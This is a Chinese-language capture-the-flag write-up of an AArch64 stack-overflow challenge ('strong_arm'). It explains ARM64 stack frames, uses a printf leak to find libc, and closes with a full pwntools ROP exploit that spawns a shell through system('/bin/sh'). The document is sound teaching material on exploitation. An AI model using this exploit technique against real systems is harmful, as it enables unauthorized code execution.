# Wpictf 2021 Strong_arm


文件来源: [strong_arm](https://github.com/datajerk/ctf-write-ups/tree/master/wpictf2021/strong_arm)
<!--more-->
## 环境搭建

安装 `qemu-user`，`libc` 和 `binutils`：

```shell
$ sudo apt install qemu-user libc6-arm64-cross binutils-aarch64-linux-gnu
```

发现交叉编译工具链里没有 `ldd`，可以用 `readelf` 替代：

```shell
$ aarch64-linux-gnu-readelf -a arm | grep 'library'
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
```

查找 gadget：

```shell
$ ropper --nocolor --file /usr/aarch64-linux-gnu/lib/libc.so.6 > gadget
$ cat gadget | grep ': ldr x0.*; ldp x29, x30, \[sp\], #0x[0-9a-f]*; ret; $'
```

## 漏洞分析

非常明显的栈溢出漏洞。但需要注意的是 Aarch64 的函数调用栈栈帧结构与 x86 不同。以该题 `main` 栈帧为例，`x29` 和 `x30` 分别是栈基址寄存器和 `lr` 。可以看到这两个寄存器的值保存在栈顶，然后才是局部变量。栈帧结构与 x86 正好是相反的。因此发生栈溢出的时候能够修改的是 `caller` 的返回地址。

```assembly
.text:00000000004006B0                 STP             X29, X30, [SP,#var_20]!
.text:00000000004006B4                 MOV             X29, SP
.text:00000000004006B8                 STR             W0, [X29,#0x20+var_4]
.text:00000000004006BC                 STR             X1, [X29,#0x20+var_10]
.text:00000000004006C0                 ADRP            X0, #printf_ptr@PAGE
.text:00000000004006C4                 LDR             X1, [X0,#printf_ptr@PAGEOFF]
.text:00000000004006C8                 ADRL            X0, aPrintAtP ; "print at %p\n"
.text:00000000004006D0                 BL              .printf
.text:00000000004006D4                 BL              vulnerable
.text:00000000004006D8                 MOV             W0, #0
.text:00000000004006DC                 LDP             X29, X30, [SP+0x20+var_20],#0x20
.text:00000000004006E0                 RET
```

由于 `ret` 指令不从栈上取返回地址，而是从 `x30` 取，因此 rop chain 的构造比 x86 要困难一些。

```python
# ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret;
gadget = 0x0000000000063e1c
payload = b'a' * 0x88 + p64(gadget + libc.address) + b'a' * 0x18 + p64(libc.sym.system) + b'a' * 0x8 + p64(next(libc.search(b'/bin/sh')))
```

这里使用的 libc 是 2.31 版本，不过构造方法应该都是一致的。首先填充 `vuln` 函数的局部变量空间以及 `x29` 然后是我们的 gadget，然后填充 `main` 的局部变量空间。在 `main` 退出时 `sp` 指向 payload 中偏移为 0xa0 的位置，因此根据我们的 gadget 需要在 0xb8 的位置填上 `/bin/sh` 地址，再在栈顶填好 `x29`  和 `x30`，就可以调用 `system("/bin/sh")` 了。

完整 exp 如下：

```python
from pwn import *

context.log_level = 'debug'

binary = ELF('./arm')
libc = ELF('/usr/aarch64-linux-gnu/lib/libc.so.6')

cmd = 'qemu-aarch64 -L /usr/aarch64-linux-gnu arm'
p = process(cmd.split(' '))

# ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret;
gadget = 0x0000000000063e1c

p.recvuntil('print at ')
leak = int(p.recvline()[:-1], 16)
libc.address = leak - libc.sym.printf
success(hex(libc.address))

payload = b'a' * 0x88 + p64(gadget + libc.address) + b'a' * 0x18 + p64(libc.sym.system) + b'a' * 0x8 + p64(next(libc.search(b'/bin/sh')))

p.sendline(payload)

p.interactive()
```


